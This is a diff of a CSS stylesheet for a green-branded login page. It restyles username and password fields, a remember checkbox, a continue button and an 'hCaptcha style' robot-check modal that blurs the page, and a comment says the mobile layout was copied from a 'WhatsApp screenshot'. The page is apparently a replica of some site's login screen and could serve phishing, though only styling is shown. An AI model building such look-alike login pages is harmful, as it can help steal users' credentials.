@@ -1,16 +1,16 @@
-/* ==========================================================================
-   BASIC VANILLA CSS (No Tailwind, Pure CSS Rules)
-   ========================================================================== */
+@import "tailwindcss";
 
-/* Universal Reset & Typography */
+/* ==========================================================================
+   Universal Reset & Base Styles
+   ========================================================================== */
 * {
-  margin: 0;
-  padding: 0;
   box-sizing: border-box;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
 }
 
-body {
+html, body {
+  margin: 0;
+  padding: 0;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
   background-color: #ffffff;
   color: #1f2937;
   line-height: 1.5;
@@ -22,9 +22,9 @@ a, button {
   color: inherit;
 }
 
-/* --------------------------------------------------------------------------
-   Header
-   -------------------------------------------------------------------------- */
+/* ==========================================================================
+   Header Component Styles
+   ========================================================================== */
 .rf-header {
   background-color: #006a4e;
   color: #ffffff;
@@ -135,13 +135,14 @@ a, button {
   border: none;
   color: #ffffff;
   cursor: pointer;
+  padding: 4px;
 }
 
 .rf-mobile-logo-badge {
   background-color: #ffffff;
   border-radius: 2px;
-  width: 46px;
-  height: 46px;
+  width: 44px;
+  height: 44px;
   padding: 8px;
   display: flex;
   align-items: center;
@@ -158,12 +159,12 @@ a, button {
   text-align: right;
   line-height: 1.2;
   cursor: pointer;
-  max-width: 60px;
+  max-width: 65px;
 }
 
-/* --------------------------------------------------------------------------
-   Main Container & Layout
-   -------------------------------------------------------------------------- */
+/* ==========================================================================
+   Main Content Layout & Forms
+   ========================================================================== */
 .rf-main-wrapper {
   max-width: 1140px;
   margin: 0 auto;
@@ -197,7 +198,11 @@ a, button {
   cursor: pointer;
 }
 
-/* Form */
+/* Desktop Form Elements */
+.rf-desktop-only {
+  display: block;
+}
+
 .rf-form {
   margin-top: 24px;
 }
@@ -258,6 +263,10 @@ a, button {
   cursor: pointer;
   border-radius: 0;
   min-width: 72px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 4px;
 }
 
 .rf-btn-show:hover {
@@ -324,7 +333,154 @@ a, button {
   margin-top: 4px;
 }
 
-/* Sidebar */
+/* ==========================================================================
+   Mobile Layout Elements (WhatsApp screenshot layout)
+   ========================================================================== */
+/* IMPORTANT: By default on desktop screens, hide mobile container completely! */
+.rf-mobile-form-container {
+  display: none !important;
+}
+
+.rf-mobile-label {
+  display: block;
+  font-size: 17px;
+  color: #1e293b;
+  margin-bottom: 8px;
+}
+
+.rf-mobile-input {
+  width: 100%;
+  height: 52px;
+  padding: 0 14px;
+  font-size: 16px;
+  border: 1px solid #334155;
+  border-radius: 0;
+  outline: none;
+  background-color: #ffffff;
+  margin-bottom: 20px;
+}
+
+.rf-mobile-password-box {
+  width: 100%;
+  height: 52px;
+  border: 1px solid #334155;
+  display: flex;
+  align-items: center;
+  padding-right: 14px;
+  background-color: #ffffff;
+  margin-bottom: 24px;
+}
+
+.rf-mobile-password-input {
+  flex: 1;
+  height: 100%;
+  padding: 0 14px;
+  font-size: 16px;
+  border: none;
+  outline: none;
+  background: transparent;
+}
+
+.rf-mobile-show-link {
+  color: #006a4e;
+  font-weight: 600;
+  font-size: 16px;
+  text-decoration: underline;
+  background: none;
+  border: none;
+  cursor: pointer;
+}
+
+.rf-mobile-checkbox-row {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin-bottom: 28px;
+}
+
+.rf-mobile-square-checkbox {
+  width: 32px;
+  height: 32px;
+  border: 2px solid #006a4e;
+  background-color: #ffffff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  border-radius: 0;
+}
+
+.rf-mobile-square-checkbox.checked {
+  background-color: #006a4e;
+  color: #ffffff;
+}
+
+.rf-mobile-checkbox-text {
+  font-size: 17px;
+  color: #1e293b;
+  user-select: none;
+  cursor: pointer;
+}
+
+.rf-mobile-continue-btn {
+  width: 100%;
+  background-color: #006a4e;
+  color: #ffffff;
+  font-size: 17px;
+  font-weight: 500;
+  padding: 13px 0;
+  border: none;
+  border-radius: 0;
+  cursor: pointer;
+  text-align: center;
+}
+
+.rf-mobile-forgot-link {
+  display: inline-block;
+  color: #006a4e;
+  font-size: 16px;
+  font-weight: 500;
+  text-decoration: underline;
+  margin-top: 20px;
+  background: none;
+  border: none;
+  cursor: pointer;
+}
+
+.rf-mobile-nav-list {
+  margin-top: 40px;
+  border-top: 1px solid #e2e8f0;
+}
+
+.rf-mobile-nav-item {
+  width: 100%;
+  padding: 16px 0;
+  border-bottom: 1px solid #e2e8f0;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: none;
+  border-left: none;
+  border-right: none;
+  border-top: none;
+  color: #006a4e;
+  font-size: 16px;
+  font-weight: 500;
+  cursor: pointer;
+  text-align: left;
+}
+
+.rf-mobile-protect-row {
+  margin-top: 32px;
+  padding-bottom: 32px;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+}
+
+/* ==========================================================================
+   Sidebar & Footer
+   ========================================================================== */
 .rf-sidebar-box {
   border: 1px solid #cbd5e1;
   background-color: #ffffff;
@@ -367,7 +523,6 @@ a, button {
   line-height: 1.4;
 }
 
-/* Footer */
 .rf-footer {
   background-color: #006a4e;
   color: #ffffff;
@@ -410,9 +565,9 @@ a, button {
   max-width: 800px;
 }
 
-/* --------------------------------------------------------------------------
+/* ==========================================================================
    Robot Verification Modal (hCaptcha style overlay)
-   -------------------------------------------------------------------------- */
+   ========================================================================== */
 .rf-modal-overlay {
   position: fixed;
   top: 0;
@@ -537,22 +692,6 @@ a, button {
   line-height: 1;
 }
 
-/* --------------------------------------------------------------------------
-   Spinning Animation
-   -------------------------------------------------------------------------- */
-@keyframes rf-spin {
-  from {
-    transform: rotate(0deg);
-  }
-  to {
-    transform: rotate(360deg);
-  }
-}
-
-.rf-animate-spin {
-  animation: rf-spin 1s linear infinite;
-}
-
 /* Blur state for main page */
 .rf-blurred {
   filter: blur(4px);
@@ -561,21 +700,21 @@ a, button {
   transition: filter 0.3s ease;
 }
 
-/* --------------------------------------------------------------------------
-   Mobile Version Alignment (Screen width <= 768px)
-   -------------------------------------------------------------------------- */
+/* ==========================================================================
+   Responsive Media Queries (Mobile <= 768px)
+   ========================================================================== */
 @media (max-width: 768px) {
   .rf-header-inner {
-    display: none;
+    display: none !important;
   }
 
   .rf-header-mobile {
-    display: flex;
+    display: flex !important;
   }
 
   .rf-main-wrapper {
-    display: block;
-    padding: 0;
+    display: block !important;
+    padding: 0 !important;
   }
 
   .rf-desktop-only {
@@ -583,147 +722,11 @@ a, button {
   }
 
   .rf-mobile-form-container {
+    display: block !important;
     padding: 24px 20px;
   }
 
-  .rf-mobile-label {
-    display: block;
-    font-size: 17px;
-    color: #1e293b;
-    margin-bottom: 8px;
-  }
-
-  .rf-mobile-input {
-    width: 100%;
-    height: 52px;
-    padding: 0 14px;
-    font-size: 16px;
-    border: 1px solid #334155;
-    border-radius: 0;
-    outline: none;
-    background-color: #ffffff;
-    margin-bottom: 20px;
-  }
-
-  .rf-mobile-password-box {
-    width: 100%;
-    height: 52px;
-    border: 1px solid #334155;
-    display: flex;
-    align-items: center;
-    padding-right: 14px;
-    background-color: #ffffff;
-    margin-bottom: 24px;
-  }
-
-  .rf-mobile-password-input {
-    flex: 1;
-    height: 100%;
-    padding: 0 14px;
-    font-size: 16px;
-    border: none;
-    outline: none;
-    background: transparent;
-  }
-
-  .rf-mobile-show-link {
-    color: #006a4e;
-    font-weight: 600;
-    font-size: 16px;
-    text-decoration: underline;
-    background: none;
-    border: none;
-    cursor: pointer;
-  }
-
-  .rf-mobile-checkbox-row {
-    display: flex;
-    align-items: center;
-    gap: 14px;
-    margin-bottom: 28px;
-  }
-
-  .rf-mobile-square-checkbox {
-    width: 32px;
-    height: 32px;
-    border: 2px solid #006a4e;
-    background-color: #ffffff;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    border-radius: 0;
-  }
-
-  .rf-mobile-square-checkbox.checked {
-    background-color: #006a4e;
-    color: #ffffff;
-  }
-
-  .rf-mobile-checkbox-text {
-    font-size: 17px;
-    color: #1e293b;
-    user-select: none;
-    cursor: pointer;
-  }
-
-  .rf-mobile-continue-btn {
-    width: 100%;
-    background-color: #006a4e;
-    color: #ffffff;
-    font-size: 17px;
-    font-weight: 500;
-    padding: 13px 0;
-    border: none;
-    border-radius: 0;
-    cursor: pointer;
-    text-align: center;
-  }
-
-  .rf-mobile-forgot-link {
-    display: inline-block;
-    color: #006a4e;
-    font-size: 16px;
-    font-weight: 500;
-    text-decoration: underline;
-    margin-top: 20px;
-    background: none;
-    border: none;
-    cursor: pointer;
-  }
-
-  .rf-mobile-nav-list {
-    margin-top: 40px;
-    border-top: 1px solid #e2e8f0;
-  }
-
-  .rf-mobile-nav-item {
-    width: 100%;
-    padding: 16px 0;
-    border-bottom: 1px solid #e2e8f0;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    background: none;
-    border-left: none;
-    border-right: none;
-    border-top: none;
-    color: #006a4e;
-    font-size: 16px;
-    font-weight: 500;
-    cursor: pointer;
-    text-align: left;
-  }
-
-  .rf-mobile-protect-row {
-    margin-top: 32px;
-    padding-bottom: 32px;
-    display: flex;
-    align-items: center;
-    gap: 16px;
-  }
-
   .rf-footer {
-    display: none;
+    display: none !important;
   }
 }
